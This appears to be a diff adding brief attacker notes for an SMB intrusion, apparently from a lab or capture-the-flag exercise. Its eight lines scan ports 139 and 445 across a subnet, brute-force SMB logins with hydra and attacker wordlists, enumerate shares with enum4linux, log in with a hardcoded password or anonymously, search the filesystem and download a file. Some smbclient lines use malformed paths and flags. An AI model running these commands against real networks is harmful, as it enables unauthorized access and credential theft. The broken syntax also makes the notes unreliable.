@@ -1,0 +1,8 @@
+nmap -p 139,445 ipaddress/24
+hydra -L /home/attacker/username.txt -P /home/attacker/password.txt ipaddress/24 smb
+enum4linux -a ipaddress/24
+smbclient ////ip//root -u John -p qw3rty
+smbclient ////ip//root
+cd /, find manually
+find / -name “name.txt” 2>/dev/null OR (ls -R / | grep “name.txt”)
+get sniffer.txt
